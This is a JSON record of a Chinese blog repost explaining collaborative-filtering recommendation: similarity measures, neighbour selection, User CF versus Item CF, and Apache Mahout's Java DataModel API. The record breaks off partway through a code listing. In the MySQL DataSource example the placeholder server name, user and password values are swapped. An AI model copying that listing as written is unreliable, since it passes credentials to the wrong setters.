[
	{
		"data":{
			"date":"2018年11月20日 21:50:04",
			"articleedittype":1,
			"private":0,
			"channel":"2",
			"description":"深入推荐引擎相关算法 - 协同过滤\n集体智慧和协同过滤\n什么是集体智慧\n集体智慧 (Collective Intelligence) 并不是 Web2.0 时代特有的，只是在 Web2.0 时代，大家在 Web 应用中利用集体智慧构建更加有趣的应用或者得到更好的用户体验。集体智慧是指在大量的人群的行为和数据中收集答案，帮助你对整个人群得到统计意义上的结论，这些结论是我们在单个个体上无法得到的，它往...",
			"title":"深入推荐引擎相关算法 - 协同过滤",
			"type":"repost",
			"content":"<h1><a id=\"___0\"></a>深入推荐引擎相关算法 - 协同过滤</h1>\n<h2><a id=\"_2\"></a>集体智慧和协同过滤</h2>\n<h3><a id=\"_4\"></a>什么是集体智慧</h3>\n<p>集体智慧 (Collective Intelligence) 并不是 Web2.0 时代特有的，只是在 Web2.0 时代，大家在 Web 应用中利用集体智慧构建更加有趣的应用或者得到更好的用户体验。集体智慧是指在大量的人群的行为和数据中收集答案，帮助你对整个人群得到统计意义上的结论，这些结论是我们在单个个体上无法得到的，它往往是某种趋势或者人群中共性的部分。</p>\n<p>Wikipedia 和 Google 是两个典型的利用集体智慧的 Web 2.0 应用：</p>\n<ul>\n<li>Wikipedia 是一个知识管理的百科全书，相对于传统的由领域专家编辑的百科全书，Wikipedia 允许最终用户贡献知识，随着参与人数的增多，Wikipedia 变成了涵盖各个领域的一本无比全面的知识库。也许有人会质疑它的权威性，但如果你从另一个侧面想这个问题，也许就可以迎刃而解。在发行一本书时，作者虽然是权威，但难免还有一些错误，然后通过一版一版的改版，书的内容越来越完善。而在 Wikipedia 上，这种改版和修正被变为每个人都可以做的事情，任何人发现错误或者不完善都可以贡献他们的想法，即便某些信息是错误的，但它一定也会尽快的被其他人纠正过来。从一个宏观的角度看，整个系统在按照一个良性循环的轨迹不断完善，这也正是集体智慧的魅力。</li>\n<li>Google：目前最流行的搜索引擎，与 Wikipedia 不同，它没有要求用户显式的贡献，但仔细想想 Google 最核心的 PageRank 的思想，它利用了 Web 页面之间的关系，将多少其他页面链接到当前页面的数目作为衡量当前页面重要与否的标准；如果这不好理解，那么你可以把它想象成一个选举的过程，每个 Web 页面都是一个投票者同时也是一个被投票者，PageRank 通过一定数目的迭代得到一个相对稳定的评分。Google 其实利用了现在 Internet 上所有 Web 页面上链接的集体智慧，找到哪些页面是重要的。</li>\n</ul>\n<h3><a id=\"_13\"></a>什么是协同过滤</h3>\n<p>协同过滤是利用集体智慧的一个典型方法。要理解什么是协同过滤 (Collaborative Filtering, 简称 CF)，首先想一个简单的问题，如果你现在想看个电影，但你不知道具体看哪部，你会怎么做？大部分的人会问问周围的朋友，看看最近有什么好看的电影推荐，而我们一般更倾向于从口味比较类似的朋友那里得到推荐。这就是协同过滤的核心思想。</p>\n<p>协同过滤一般是在海量的用户中发掘出一小部分和你品位比较类似的，在协同过滤中，这些用户成为邻居，然后根据他们喜欢的其他东西组织成一个排序的目录作为推荐给你。当然其中有一个核心的问题：</p>\n<ul>\n<li>如何确定一个用户是不是和你有相似的品位？</li>\n<li>如何将邻居们的喜好组织成一个排序的目录？</li>\n</ul>\n<p>协同过滤相对于集体智慧而言，它从一定程度上保留了个体的特征，就是你的品位偏好，所以它更多可以作为个性化推荐的算法思想。可以想象，这种推荐策略在 Web 2.0 的长尾中是很重要的，将大众流行的东西推荐给长尾中的人怎么可能得到好的效果，这也回到推荐系统的一个核心问题：了解你的用户，然后才能给出更好的推荐。</p>\n<h3><a id=\"_24\"></a>深入协同过滤的核心</h3>\n<p>前面作为背景知识，介绍了集体智慧和协同过滤的基本思想，这一节我们将深入分析协同过滤的原理，介绍基于协同过滤思想的多种推荐机制，优缺点和实用场景。</p>\n<p>首先，要实现协同过滤，需要一下几个步骤</p>\n<ul>\n<li>收集用户偏好</li>\n<li>找到相似的用户或物品</li>\n<li>计算推荐</li>\n</ul>\n<h3><a id=\"_34\"></a>收集用户偏好</h3>\n<p>要从用户的行为和偏好中发现规律，并基于此给予推荐，如何收集用户的偏好信息成为系统推荐效果最基础的决定因素。用户有很多方式向系统提供自己的偏好信息，而且不同的应用也可能大不相同，下面举例进行介绍：</p>\n<h5><a id=\"_1__38\"></a>表 1 用户行为和用户偏好</h5>\n\n<table>\n<thead>\n<tr>\n<th><strong>用户行为</strong></th>\n<th><strong>类型</strong></th>\n<th><strong>特征</strong></th>\n<th><strong>作用</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>评分</td>\n<td>显式</td>\n<td>整数量化的偏好，可能的取值是 [0, n]；n 一般取值为 5 或者是 10</td>\n<td>通过用户对物品的评分，可以精确的得到用户的偏好</td>\n</tr>\n<tr>\n<td>投票</td>\n<td>显式</td>\n<td>布尔量化的偏好，取值是 0 或 1</td>\n<td>通过用户对物品的投票，可以较精确的得到用户的偏好</td>\n</tr>\n<tr>\n<td>转发</td>\n<td>显式</td>\n<td>布尔量化的偏好，取值是 0 或 1</td>\n<td>通过用户对物品的投票，可以精确的得到用户的偏好。 如果是站内，同时可以推理得到被转发人的偏好（不精确）</td>\n</tr>\n<tr>\n<td>保存书签</td>\n<td>显示</td>\n<td>布尔量化的偏好，取值是 0 或 1</td>\n<td>通过用户对物品的投票，可以精确的得到用户的偏好。</td>\n</tr>\n<tr>\n<td>标记标签  (Tag)</td>\n<td>显示</td>\n<td>一些单词，需要对单词进行分析，得到偏好</td>\n<td>通过分析用户的标签，可以得到用户对项目的理解，同时可以分析出用户的情感：喜欢还是讨厌</td>\n</tr>\n<tr>\n<td>评论</td>\n<td>显示</td>\n<td>一段文字，需要进行文本分析，得到偏好</td>\n<td>通过分析用户的评论，可以得到用户的情感：喜欢还是讨厌</td>\n</tr>\n<tr>\n<td>点击流  ( 查看 )</td>\n<td>隐式</td>\n<td>一组用户的点击，用户对物品感兴趣，需要进行分析，得到偏好</td>\n<td>用户的点击一定程度上反映了用户的注意力，所以它也可以从一定程度上反映用户的喜好。</td>\n</tr>\n<tr>\n<td>页面停留时间</td>\n<td>隐式</td>\n<td>一组时间信息，噪音大，需要进行去噪，分析，得到偏好</td>\n<td>用户的页面停留时间一定程度上反映了用户的注意力和喜好，但噪音偏大，不好利用。</td>\n</tr>\n<tr>\n<td>购买</td>\n<td>隐式</td>\n<td>布尔量化的偏好，取值是 0 或 1</td>\n<td>用户的购买是很明确的说明这个项目它感兴趣。</td>\n</tr>\n</tbody>\n</table><p>以上列举的用户行为都是比较通用的，推荐引擎设计人员可以根据自己应用的特点添加特殊的用户行为，并用他们表示用户对物品的喜好。</p>\n<p>在一般应用中，我们提取的用户行为一般都多于一种，关于如何组合这些不同的用户行为，基本上有以下两种方式：</p>\n<ul>\n<li>将不同的行为分组：一般可以分为“查看”和“购买”等等，然后基于不同的行为，计算不同的用户 / 物品相似度。类似于当当网或者 Amazon 给出的“购买了该图书的人还购买了 …”，“查看了图书的人还查看了 …”</li>\n<li>根据不同行为反映用户喜好的程度将它们进行加权，得到用户对于物品的总体喜好。一般来说，显式的用户反馈比隐式的权值大，但比较稀疏，毕竟进行显示反馈的用户是少数；同时相对于“查看”，“购买”行为反映用户喜好的程度更大，但这也因应用而异。</li>\n</ul>\n<p>收集了用户行为数据，我们还需要对数据进行一定的预处理，其中最核心的工作就是：减噪和归一化。</p>\n<ul>\n<li>减噪：用户行为数据是用户在使用应用过程中产生的，它可能存在大量的噪音和用户的误操作，我们可以通过经典的数据挖掘算法过滤掉行为数据中的噪音，这样可以是我们的分析更加精确。</li>\n<li>归一化：如前面讲到的，在计算用户对物品的喜好程度时，可能需要对不同的行为数据进行加权。但可以想象，不同行为的数据取值可能相差很大，比如，用户的查看数据必然比购买数据大的多，如何将各个行为的数据统一在一个相同的取值范围中，从而使得加权求和得到的总体喜好更加精确，就需要我们进行归一化处理。最简单的归一化处理，就是将各类数据除以此类中的最大值，以保证归一化后的数据取值在 [0,1] 范围中。</li>\n</ul>\n<p>进行的预处理后，根据不同应用的行为分析方法，可以选择分组或者加权处理，之后我们可以得到一个用户偏好的二维矩阵，一维是用户列表，另一维是物品列表，值是用户对物品的偏好，一般是 [0,1] 或者 [-1, 1] 的浮点数值。</p>\n<h3><a id=\"_66\"></a>找到相似的用户或物品</h3>\n<p>当已经对用户行为进行分析得到用户喜好后，我们可以根据用户喜好计算相似用户和物品，然后基于相似用户或者物品进行推荐，这就是最典型的 CF 的两个分支：基于用户的 CF 和基于物品的 CF。这两种方法都需要计算相似度，下面我们先看看最基本的几种计算相似度的方法。</p>\n<p><strong>相似度的计算</strong></p>\n<p>关于相似度的计算，现有的几种基本方法都是基于向量（Vector）的，其实也就是计算两个向量的距离，距离越近相似度越大。在推荐的场景中，在用户 - 物品偏好的二维矩阵中，我们可以将一个用户对所有物品的偏好作为一个向量来计算用户之间的相似度，或者将所有用户对某个物品的偏好作为一个向量来计算物品之间的相似度。下面我们详细介绍几种常用的相似度计算方法：</p>\n<ul>\n<li>欧几里德距离（Euclidean Distance）</li>\n</ul>\n<p>最初用于计算欧几里德空间中两个点的距离，假设 x，y 是 n 维空间的两个点，它们之间的欧几里德距离是：</p>\n<p><img src=\"https://www.ibm.com/developerworks/cn/web/1103_zhaoct_recommstudy2/image003.gif\" alt=\"Figure xxx. Requires a heading\"></p>\n<p>可以看出，当 n=2 时，欧几里德距离就是平面上两个点的距离。欧几里德学习视频： <a href=\"https://www.yxgapp.com/video/c8426884-2b56-494f-a274-0aa3105503f1.html\">《机器学习Python实践》#15 欧几里得距离</a></p>\n<p>当用欧几里德距离表示相似度，一般采用以下公式进行转换：距离越小，相似度越大</p>\n<p><img src=\"https://www.ibm.com/developerworks/cn/web/1103_zhaoct_recommstudy2/image005.gif\" alt=\"Figure xxx. Requires a heading\"></p>\n<ul>\n<li>皮尔逊相关系数（Pearson Correlation Coefficient）</li>\n</ul>\n<p>皮尔逊相关系数一般用于计算两个定距变量间联系的紧密程度，它的取值在 [-1，+1] 之间。</p>\n<p><img src=\"https://www.ibm.com/developerworks/cn/web/1103_zhaoct_recommstudy2/image007.gif\" alt=\"Figure xxx. Requires a heading\"></p>\n<p>sx, sy是 x 和 y 的样品标准偏差。</p>\n<ul>\n<li>Cosine 相似度（Cosine Similarity）</li>\n</ul>\n<p>Cosine 相似度被广泛应用于计算文档数据的相似度：</p>\n<p><img src=\"https://www.ibm.com/developerworks/cn/web/1103_zhaoct_recommstudy2/image009.gif\" alt=\"Figure xxx. Requires a heading\"></p>\n<ul>\n<li>Tanimoto 系数（Tanimoto Coefficient）</li>\n</ul>\n<p>Tanimoto 系数也称为 Jaccard 系数，是 Cosine 相似度的扩展，也多用于计算文档数据的相似度：</p>\n<p><img src=\"https://www.ibm.com/developerworks/cn/web/1103_zhaoct_recommstudy2/image011.gif\" alt=\"Figure xxx. Requires a heading\"></p>\n<p><strong>相似邻居的计算</strong></p>\n<p>介绍完相似度的计算方法，下面我们看看如何根据相似度找到用户 - 物品的邻居，常用的挑选邻居的原则可以分为两类：图 1 给出了二维平面空间上点集的示意图。</p>\n<ul>\n<li>固定数量的邻居：K-neighborhoods 或者 Fix-size neighborhoods</li>\n</ul>\n<p>不论邻居的“远近”，只取最近的 K 个，作为其邻居。如图 1 中的 A，假设要计算点 1 的 5- 邻居，那么根据点之间的距离，我们取最近的 5 个点，分别是点 2，点 3，点 4，点 7 和点 5。但很明显我们可以看出，这种方法对于孤立点的计算效果不好，因为要取固定个数的邻居，当它附近没有足够多比较相似的点，就被迫取一些不太相似的点作为邻居，这样就影响了邻居相似的程度，比如图 1 中，点 1 和点 5 其实并不是很相似。</p>\n<ul>\n<li>基于相似度门槛的邻居：Threshold-based neighborhoods</li>\n</ul>\n<p>与计算固定数量的邻居的原则不同，基于相似度门槛的邻居计算是对邻居的远近进行最大值的限制，落在以当前点为中心，距离为 K 的区域中的所有点都作为当前点的邻居，这种方法计算得到的邻居个数不确定，但相似度不会出现较大的误差。如图 1 中的 B，从点 1 出发，计算相似度在 K 内的邻居，得到点 2，点 3，点 4 和点 7，这种方法计算出的邻居的相似度程度比前一种优，尤其是对孤立点的处理。</p>\n<h5><a id=\"_1_124\"></a>图 1.相似邻居计算示意图</h5>\n<p><img src=\"https://ws4.sinaimg.cn/large/006tNbRwly1fxev00vhkxg30ej08iwef.gif\" alt=\"\"></p>\n<h3><a id=\"_128\"></a>计算推荐</h3>\n<p>经过前期的计算已经得到了相邻用户和相邻物品，下面介绍如何基于这些信息为用户进行推荐。本系列的上一篇综述文章已经简要介绍过基于协同过滤的推荐算法可以分为基于用户的 CF 和基于物品的 CF，下面我们深入这两种方法的计算方法，使用场景和优缺点。</p>\n<p><strong>基于用户的 CF（User CF）</strong></p>\n<p>基于用户的 CF 的基本思想相当简单，基于用户对物品的偏好找到相邻邻居用户，然后将邻居用户喜欢的推荐给当前用户。计算上，就是将一个用户对所有物品的偏好作为一个向量来计算用户之间的相似度，找到 K 邻居后，根据邻居的相似度权重以及他们对物品的偏好，预测当前用户没有偏好的未涉及物品，计算得到一个排序的物品列表作为推荐。图 2 给出了一个例子，对于用户 A，根据用户的历史偏好，这里只计算得到一个邻居 - 用户 C，然后将用户 C 喜欢的物品 D 推荐给用户 A。</p>\n<h5><a id=\"_2_CF__136\"></a>图 2.基于用户的 CF 的基本原理</h5>\n<p><img src=\"https://ws3.sinaimg.cn/large/006tNbRwly1fxev0k5q29g30aw08wglm.gif\" alt=\"\"></p>\n<p><strong>基于物品的 CF（Item CF）</strong></p>\n<p>基于物品的 CF 的原理和基于用户的 CF 类似，只是在计算邻居时采用物品本身，而不是从用户的角度，即基于用户对物品的偏好找到相似的物品，然后根据用户的历史偏好，推荐相似的物品给他。从计算的角度看，就是将所有用户对某个物品的偏好作为一个向量来计算物品之间的相似度，得到物品的相似物品后，根据用户历史的偏好预测当前用户还没有表示偏好的物品，计算得到一个排序的物品列表作为推荐。图 3 给出了一个例子，对于物品 A，根据所有用户的历史偏好，喜欢物品 A 的用户都喜欢物品 C，得出物品 A 和物品 C 比较相似，而用户 C 喜欢物品 A，那么可以推断出用户 C 可能也喜欢物品 C。</p>\n<h5><a id=\"_3_CF__144\"></a>图 3.基于物品的 CF 的基本原理</h5>\n<p><img src=\"https://ws2.sinaimg.cn/large/006tNbRwly1fxev0tb00rg30aa099glm.gif\" alt=\"†\"></p>\n<p><strong>User CF vs. Item CF</strong></p>\n<p>前面介绍了 User CF 和 Item CF 的基本原理，下面我们分几个不同的角度深入看看它们各自的优缺点和适用场景：</p>\n<ul>\n<li>计算复杂度</li>\n</ul>\n<p>Item CF 和 User CF 是基于协同过滤推荐的两个最基本的算法，User CF 是很早以前就提出来了，Item CF 是从 Amazon 的论文和专利发表之后（2001 年左右）开始流行，大家都觉得 Item CF 从性能和复杂度上比 User CF 更优，其中的一个主要原因就是对于一个在线网站，用户的数量往往大大超过物品的数量，同时物品的数据相对稳定，因此计算物品的相似度不但计算量较小，同时也不必频繁更新。但我们往往忽略了这种情况只适应于提供商品的电子商务网站，对于新闻，博客或者微内容的推荐系统，情况往往是相反的，物品的数量是海量的，同时也是更新频繁的，所以单从复杂度的角度，这两个算法在不同的系统中各有优势，推荐引擎的设计者需要根据自己应用的特点选择更加合适的算法。</p>\n<ul>\n<li>适用场景</li>\n</ul>\n<p>在非社交网络的网站中，内容内在的联系是很重要的推荐原则，它比基于相似用户的推荐原则更加有效。比如在购书网站上，当你看一本书的时候，推荐引擎会给你推荐相关的书籍，这个推荐的重要性远远超过了网站首页对该用户的综合推荐。可以看到，在这种情况下，Item CF 的推荐成为了引导用户浏览的重要手段。同时 Item CF 便于为推荐做出解释，在一个非社交网络的网站中，给某个用户推荐一本书，同时给出的解释是某某和你有相似兴趣的人也看了这本书，这很难让用户信服，因为用户可能根本不认识那个人；但如果解释说是因为这本书和你以前看的某本书相似，用户可能就觉得合理而采纳了此推荐。</p>\n<p>相反的，在现今很流行的社交网络站点中，User CF 是一个更不错的选择，User CF 加上社会网络信息，可以增加用户对推荐解释的信服程度。</p>\n<ul>\n<li>推荐多样性和精度</li>\n</ul>\n<p>研究推荐引擎的学者们在相同的数据集合上分别用 User CF 和 Item CF 计算推荐结果，发现推荐列表中，只有 50% 是一样的，还有 50% 完全不同。但是这两个算法确有相似的精度，所以可以说，这两个算法是很互补的。</p>\n<p>关于推荐的多样性，有两种度量方法：</p>\n<p>第一种度量方法是从单个用户的角度度量，就是说给定一个用户，查看系统给出的推荐列表是否多样，也就是要比较推荐列表中的物品之间两两的相似度，不难想到，对这种度量方法，Item CF 的多样性显然不如 User CF 的好，因为 Item CF 的推荐就是和以前看的东西最相似的。</p>\n<p>第二种度量方法是考虑系统的多样性，也被称为覆盖率 (Coverage)，它是指一个推荐系统是否能够提供给所有用户丰富的选择。在这种指标下，Item CF 的多样性要远远好于 User CF, 因为 User CF 总是倾向于推荐热门的，从另一个侧面看，也就是说，Item CF 的推荐有很好的新颖性，很擅长推荐长尾里的物品。所以，尽管大多数情况，Item CF 的精度略小于 User CF， 但如果考虑多样性，Item CF 却比 User CF 好很多。</p>\n<p>如果你对推荐的多样性还心存疑惑，那么下面我们再举个实例看看 User CF 和 Item CF 的多样性到底有什么差别。首先，假设每个用户兴趣爱好都是广泛的，喜欢好几个领域的东西，不过每个用户肯定也有一个主要的领域，对这个领域会比其他领域更加关心。给定一个用户，假设他喜欢 3 个领域 A,B,C，A 是他喜欢的主要领域，这个时候我们来看 User CF 和 Item CF 倾向于做出什么推荐：如果用 User CF, 它会将 A,B,C 三个领域中比较热门的东西推荐给用户；而如果用 ItemCF，它会基本上只推荐 A 领域的东西给用户。所以我们看到因为 User CF 只推荐热门的，所以它在推荐长尾里项目方面的能力不足；而 Item CF 只推荐 A 领域给用户，这样他有限的推荐列表中就可能包含了一定数量的不热门的长尾物品，同时 Item CF 的推荐对这个用户而言，显然多样性不足。但是对整个系统而言，因为不同的用户的主要兴趣点不同，所以系统的覆盖率会比较好。</p>\n<p>从上面的分析，可以很清晰的看到，这两种推荐都有其合理性，但都不是最好的选择，因此他们的精度也会有损失。其实对这类系统的最好选择是，如果系统给这个用户推荐 30 个物品，既不是每个领域挑选 10 个最热门的给他，也不是推荐 30 个 A 领域的给他，而是比如推荐 15 个 A 领域的给他，剩下的 15 个从 B,C 中选择。所以结合 User CF 和 Item CF 是最优的选择，结合的基本原则就是当采用 Item CF 导致系统对个人推荐的多样性不足时，我们通过加入 User CF 增加个人推荐的多样性，从而提高精度，而当因为采用 User CF 而使系统的整体多样性不足时，我们可以通过加入 Item CF 增加整体的多样性，同样同样可以提高推荐的精度。</p>\n<ul>\n<li>用户对推荐算法的适应度</li>\n</ul>\n<p>前面我们大部分都是从推荐引擎的角度考虑哪个算法更优，但其实我们更多的应该考虑作为推荐引擎的最终使用者 – 应用用户对推荐算法的适应度。</p>\n<p>对于 User CF，推荐的原则是假设用户会喜欢那些和他有相同喜好的用户喜欢的东西，但如果一个用户没有相同喜好的朋友，那 User CF 的算法的效果就会很差，所以一个用户对的 CF 算法的适应度是和他有多少共同喜好用户成正比的。</p>\n<p>Item CF 算法也有一个基本假设，就是用户会喜欢和他以前喜欢的东西相似的东西，那么我们可以计算一个用户喜欢的物品的自相似度。一个用户喜欢物品的自相似度大，就说明他喜欢的东西都是比较相似的，也就是说他比较符合 Item CF 方法的基本假设，那么他对 Item CF 的适应度自然比较好；反之，如果自相似度小，就说明这个用户的喜好习惯并不满足 Item CF 方法的基本假设，那么对于这种用户，用 Item CF 方法做出好的推荐的可能性非常低。</p>\n<p>通过以上的介绍，相信大家已经对协同过滤推荐的各种方法，原则，特点和适用场景有深入的了解，下面我们就进入实战阶段，重点介绍如何基于 Apache Mahout 实现协同过滤推荐算法。</p>\n<h2><a id=\"_Apache_Mahout__186\"></a>基于 Apache Mahout 实现高效的协同过滤推荐</h2>\n<p>Apache Mahout 是 Apache Software Foundation (ASF) 旗下的一个开源项目，提供一些可扩展的机器学习领域经典算法的实现，旨在帮助开发人员更加方便快捷地创建智能应用程序，并且，在 Mahout 的最近版本中还加入了对 Apache Hadoop 的支持，使这些算法可以更高效的运行在云计算环境中。</p>\n<p>关于 Apache Mahout 的安装和配置请参考《基于 Apache Mahout 构建社会化推荐引擎》，它是笔者 09 年发表的一篇关于基于 Mahout 实现推荐引擎的 developerWorks 文章，其中详细介绍了 Mahout 的安装步骤，并给出一个简单的电影推荐引擎的例子。</p>\n<p>Apache Mahout 中提供的一个协同过滤算法的高效实现，它是一个基于 Java 实现的可扩展的，高效的推荐引擎。图 4 给出了 Apache Mahout 中协同过滤推荐实现的组件图，下面我们逐步深入介绍各个部分。</p>\n<h5><a id=\"_4_194\"></a>图 4.组件图</h5>\n<p><img src=\"https://ws3.sinaimg.cn/large/006tNbRwly1fxev2pr7jeg30cs09zglj.gif\" alt=\"\"></p>\n<h3><a id=\"Data_Model_198\"></a>数据表示：Data Model</h3>\n<p><strong>Preference</strong></p>\n<p>基于协同过滤的推荐引擎的输入是用户的历史偏好信息，在 Mahout 里它被建模为 Preference（接口），一个 Preference 就是一个简单的三元组 &lt; 用户 ID, 物品 ID, 用户偏好 &gt;，它的实现类是 GenericPreference，可以通过以下语句创建一个 GenericPreference。</p>\n<p>GenericPreference preference = new GenericPreference(123, 456, 3.0f);</p>\n<p>这其中， 123 是用户 ID，long 型；456 是物品 ID，long 型；3.0f 是用户偏好，float 型。从这个例子我们可以看出，单单一个 GenericPreference 的数据就占用 20 bytes，所以你会发现如果只简单实用数组 Array 加载用户偏好数据，必然占用大量的内存，Mahout 在这方面做了一些优化，它创建了 PreferenceArray（接口）保存一组用户偏好数据，为了优化性能，Mahout 给出了两个实现类，GenericUserPreferenceArray 和 GenericItemPreferenceArray，分别按照用户和物品本身对用户偏好进行组装，这样就可以压缩用户 ID 或者物品 ID 的空间。下面清单 1 的代码以 GenericUserPreferenceArray 为例，展示了如何创建和使用一个 PreferenceArray。</p>\n<h5><a id=\"_1__PreferenceArray_208\"></a>清单 1. 创建和使用 PreferenceArray</h5>\n<pre><code class=\"prism language-java\">PreferenceArray userPref <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">GenericUserPreferenceArray</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//size = 2 </span>\n \nuserPref<span class=\"token punctuation\">.</span><span class=\"token function\">setUserID</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n \nuserPref<span class=\"token punctuation\">.</span><span class=\"token function\">setItemID</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">101</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//&lt;1L, 101L, 2.0f&gt; </span>\nuserPref<span class=\"token punctuation\">.</span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2.0f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \nuserPref<span class=\"token punctuation\">.</span><span class=\"token function\">setItemID</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//&lt;1L, 102L, 4.0f&gt; </span>\nuserPref<span class=\"token punctuation\">.</span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4.0f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n \nPreference pref <span class=\"token operator\">=</span> userPref<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">//&lt;1L, 102L, 4.0f&gt;</span>\n</code></pre>\n<p>为了提高性能 Mahout 还构建了自己的 HashMap 和 Set：FastByIDMap 和 FastIDSet，有兴趣的朋友可以参考 Mahout 官方说明。</p>\n<p><strong>DataModel</strong></p>\n<p>Mahout 的推荐引擎实际接受的输入是 DataModel，它是对用户偏好数据的压缩表示，通过创建内存版 DataModel 的语句我们可以看出：</p>\n<p>DataModel model = new GenericDataModel(FastByIDMap map);</p>\n<p>他保存在一个按照用户 ID 或者物品 ID 进行散列的 PreferenceArray，而 PreferenceArray 中对应保存着这个用户 ID 或者物品 ID 的所有用户偏好信息。</p>\n<p>DataModel 是用户喜好信息的抽象接口，它的具体实现支持从任意类型的数据源抽取用户喜好信息，具体实现包括内存版的 GenericDataModel，支持文件读取的 FileDataModel 和支持数据库读取的 JDBCDataModel，下面我们看看如何创建各种 DataModel。</p>\n<h5><a id=\"_2__DataModel_235\"></a>清单 2. 创建各种 DataModel</h5>\n<pre><code class=\"prism language-java\"><span class=\"token comment\">//In-memory DataModel - GenericDataModel </span>\n FastByIDMap<span class=\"token generics function\"><span class=\"token punctuation\">&lt;</span>PreferenceArray<span class=\"token punctuation\">&gt;</span></span> preferences <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FastByIDMap</span><span class=\"token generics function\"><span class=\"token punctuation\">&lt;</span>PreferenceArray<span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n \n PreferenceArray prefsForUser1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">GenericUserPreferenceArray</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \n prefsForUser1<span class=\"token punctuation\">.</span><span class=\"token function\">setUserID</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n prefsForUser1<span class=\"token punctuation\">.</span><span class=\"token function\">setItemID</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">101</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n prefsForUser1<span class=\"token punctuation\">.</span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3.0f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \n prefsForUser1<span class=\"token punctuation\">.</span><span class=\"token function\">setItemID</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n prefsForUser1<span class=\"token punctuation\">.</span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4.5f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n… <span class=\"token punctuation\">(</span><span class=\"token number\">8</span> more<span class=\"token punctuation\">)</span> \n preferences<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span>L<span class=\"token punctuation\">,</span> prefsForUser1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">//use userID as the key </span>\n… <span class=\"token punctuation\">(</span>more users<span class=\"token punctuation\">)</span> \n \n DataModel model <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">GenericDataModel</span><span class=\"token punctuation\">(</span>preferences<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n \n <span class=\"token comment\">//File-based DataModel - FileDataModel </span>\n DataModel dataModel <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FileDataModel</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"preferences.csv\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n \n <span class=\"token comment\">//Database-based DataModel - MySQLJDBCDataModel </span>\n MysqlDataSource dataSource <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MysqlDataSource</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n dataSource<span class=\"token punctuation\">.</span><span class=\"token function\">setServerName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"my_user\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n dataSource<span class=\"token punctuation\">.</span><span class=\"token function\">setUser</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"my_password\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n dataSource<span class=\"token punctuation\">.</span><span class=\"token function\">setPassword</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"my_database_host\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n JDBCDataModel dataModel <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MySQLJDBCDataModel</span><span class=\"token punctuation\">(</span>dataSource<span class=\"token punctuation\">,</span> <span class=\"token string\">\"my_prefs_table\"</span><span class=\"token punctuation\">,</span> \n <span class=\"token string\">\"my_user_column\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"my_item_column\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"my_pref_value_column\"</span><span 